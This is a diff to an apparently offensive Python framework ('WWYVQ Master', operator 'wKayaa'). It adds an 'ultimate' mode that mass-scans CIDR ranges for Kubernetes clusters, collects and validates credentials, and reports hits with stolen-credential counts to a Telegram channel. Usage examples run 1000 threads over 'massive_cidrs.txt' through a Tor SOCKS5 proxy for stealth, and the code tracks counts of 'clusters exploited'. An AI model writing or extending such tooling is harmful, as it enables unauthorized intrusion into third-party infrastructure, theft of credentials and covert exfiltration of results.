@@ -48,6 +48,14 @@ try:
     except ImportError:
         WEB_AVAILABLE = False
         print("⚠️ Interface web non disponible")
+    
+    # Ultimate K8s Scanner
+    try:
+        from k8s_scanner_ultimate import K8sUltimateScanner, ScannerConfig, ScanMode, ValidationType
+        ULTIMATE_SCANNER_AVAILABLE = True
+    except ImportError:
+        ULTIMATE_SCANNER_AVAILABLE = False
+        print("⚠️ K8s Ultimate Scanner non disponible")
         
     ALL_MODULES_OK = True
     
@@ -70,6 +78,7 @@ class WWYVQMasterFramework:
         self.mail_hunter = None
         self.telegram_notifier = None
         self.web_manager = None
+        self.ultimate_scanner = None
         
         # Configuration unifiée
         self.config = self._build_unified_config()
@@ -84,7 +93,9 @@ class WWYVQMasterFramework:
             "clusters_exploited": 0,
             "mail_credentials": 0,
             "telegram_alerts": 0,
-            "perfect_hits": 0
+            "perfect_hits": 0,
+            "ultimate_scan_results": 0,
+            "validated_credentials": 0
         }
         
         print(f"""
@@ -111,7 +122,10 @@ class WWYVQMasterFramework:
             "telegram_token": self.args.telegram_token,
             "telegram_chat": self.args.telegram_chat,
             "web_enabled": self.args.web,
-            "mail_focus": self.args.mode == "mail"
+            "mail_focus": self.args.mode == "mail",
+            "ultimate_mode": self.args.mode == "ultimate",
+            "validate_credentials": getattr(self.args, 'validate_credentials', False),
+            "proxy_config": getattr(self.args, 'proxy', None)
         }
     
     async def initialize_all_systems(self):
@@ -145,7 +159,21 @@ class WWYVQMasterFramework:
         else:
             print("⚠️ Telegram désactivé")
         
-        # 5. Interface Web (optionnelle)
+        # 5. Ultimate K8s Scanner (if available and requested)
+        if ULTIMATE_SCANNER_AVAILABLE and self.config["ultimate_mode"]:
+            scanner_config = ScannerConfig(
+                mode=ScanMode.ULTIMATE if self.args.mode == "ultimate" else ScanMode.BALANCED,
+                max_concurrent=self.config["threads"],
+                timeout=self.config["timeout"],
+                validation_type=ValidationType.COMPREHENSIVE if self.config["validate_credentials"] else ValidationType.BASIC,
+                output_dir=Path(f"./results_{self.session_id}")
+            )
+            self.ultimate_scanner = K8sUltimateScanner(scanner_config)
+            print("✅ K8s Ultimate Scanner (k8s_scanner_ultimate.py)")
+        else:
+            print("⚠️ Ultimate Scanner désactivé")
+        
+        # 6. Interface Web (optionnelle)
         if self.args.web and WEB_AVAILABLE:
             self.web_manager = ExploitationManager()
             self._start_web_interface()
@@ -160,7 +188,9 @@ class WWYVQMasterFramework:
 ├── Timeout: {self.args.timeout}s
 ├── Telegram: {'✅' if self.config['telegram_token'] else '❌'}
 ├── Interface Web: {'✅' if self.args.web else '❌'}
-└── Mail Focus: {'✅' if self.config['mail_focus'] else '❌'}
+├── Mail Focus: {'✅' if self.config['mail_focus'] else '❌'}
+├── Ultimate Scanner: {'✅' if self.config['ultimate_mode'] else '❌'}
+└── Credential Validation: {'✅' if self.config['validate_credentials'] else '❌'}
         """)
     
     def _start_web_interface(self):
@@ -239,6 +269,8 @@ ALL SYSTEMS OPERATIONAL! 🚀"""
             await self._run_mail_mode(targets)
         elif self.args.mode == "stealth":
             await self._run_stealth_mode(targets)
+        elif self.args.mode == "ultimate":
+            await self._run_ultimate_mode(targets)
         elif self.args.mode == "all":
             await self._run_all_modes(targets)
         
@@ -311,6 +343,59 @@ ALL SYSTEMS OPERATIONAL! 🚀"""
         await stealth_orchestrator.initialize(stealth_config)
         await stealth_orchestrator.run_exploitation(targets)
     
+    async def _run_ultimate_mode(self, targets):
+        """Mode ultimate - K8s Ultimate Scanner with advanced features"""
+        print("🚀 MODE ULTIMATE - Advanced K8s Scanner with Enterprise Features")
+        
+        if not self.ultimate_scanner:
+            print("❌ Ultimate Scanner not available")
+            return
+        
+        try:
+            # Run the ultimate scanner
+            print(f"🎯 Scanning {len(targets)} targets with ultimate capabilities")
+            results = await self.ultimate_scanner.scan_targets(targets)
+            
+            # Update global statistics
+            self.global_stats["ultimate_scan_results"] = len(results)
+            self.global_stats["clusters_found"] = len([r for r in results if r.service == "kubernetes"])
+            
+            # Count credentials
+            total_credentials = sum(len(r.credentials) for r in results)
+            validated_credentials = sum(len([c for c in r.credentials if c.validated]) for r in results)
+            
+            self.global_stats["mail_credentials"] = total_credentials
+            self.global_stats["validated_credentials"] = validated_credentials
+            
+            print(f"""
+🎯 ULTIMATE SCAN COMPLETE:
+├── Services Found: {len(results)}
+├── K8s Clusters: {self.global_stats['clusters_found']}
+├── Total Credentials: {total_credentials}
+├── Validated Credentials: {validated_credentials}
+└── Success Rate: {(validated_credentials/total_credentials*100) if total_credentials > 0 else 0:.1f}%
+            """)
+            
+            # Send Telegram notification if available
+            if self.telegram_notifier and validated_credentials > 0:
+                telegram_msg = f"""🔥 ULTIMATE SCAN HIT!
+
+🎯 Target: Multiple
+💎 Session: {self.session_id}
+🔍 Mode: ULTIMATE SCANNER
+⚡ Results: {len(results)} services
+🔑 Credentials: {total_credentials} found, {validated_credentials} validated
+
+wKayaa Production - {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')}"""
+                
+                await self.telegram_notifier.telegram._send_telegram_message(telegram_msg)
+                self.global_stats["telegram_alerts"] += 1
+            
+        except Exception as e:
+            print(f"❌ Ultimate scanner error: {e}")
+            import traceback
+            traceback.print_exc()
+    
     async def _run_all_modes(self, targets):
         """Mode ALL - Tous les modules en parallèle"""
         print("🌟 MODE ALL - TOUS LES MODULES ACTIFS")
@@ -347,7 +432,9 @@ ALL SYSTEMS OPERATIONAL! 🚀"""
 ├── Clusters Exploited: {self.global_stats['clusters_exploited']}
 ├── Mail Credentials: {self.global_stats['mail_credentials']}
 ├── Telegram Alerts: {self.global_stats['telegram_alerts']}
-└── Perfect Hits: {self.global_stats['perfect_hits']}
+├── Perfect Hits: {self.global_stats['perfect_hits']}
+├── Ultimate Scan Results: {self.global_stats['ultimate_scan_results']}
+└── Validated Credentials: {self.global_stats['validated_credentials']}
 
 👤 Operator: wKayaa
 📅 Completed: {datetime.utcnow().isoformat()}
@@ -382,18 +469,20 @@ def parse_master_arguments():
   aggressive - Exploit avancé (k8s_exploit_master.py)  
   mail       - Focus mail services (mail_services_hunter.py)
   stealth    - Mode discret
+  ultimate   - Advanced K8s Scanner (k8s_scanner_ultimate.py)
   all        - TOUS les modules en parallèle
 
 📚 EXEMPLES:
   python wwyvq_master_final.py --mode aggressive --file targets.txt --threads 500
   python wwyvq_master_final.py --mode mail --target 192.168.1.0/24 --telegram-token TOKEN
+  python wwyvq_master_final.py --mode ultimate --file massive_cidrs.txt --threads 1000 --validate-credentials
   python wwyvq_master_final.py --mode all --file targets.txt --web --threads 1000
   python wwyvq_master_final.py --mode stealth --target example.com --threads 5
         '''
     )
     
     # Mode principal
-    parser.add_argument('--mode', choices=['standard', 'aggressive', 'mail', 'stealth', 'all'], 
+    parser.add_argument('--mode', choices=['standard', 'aggressive', 'mail', 'stealth', 'ultimate', 'all'], 
                        default='aggressive', help='Mode d\'exploitation')
     
     # Cibles
@@ -410,6 +499,11 @@ def parse_master_arguments():
     
     # Interface
     parser.add_argument('--web', action='store_true', help='Interface web (port 5000)')
+    
+    # Ultimate Scanner Options
+    parser.add_argument('--validate-credentials', action='store_true', 
+                       help='Enable real-time credential validation (ultimate mode)')
+    parser.add_argument('--proxy', help='SOCKS5/HTTP proxy for stealth (format: socks5://127.0.0.1:9050)')
     
     # Options
     parser.add_argument('--verbose', '-v', action='store_true', help='Mode verbose')
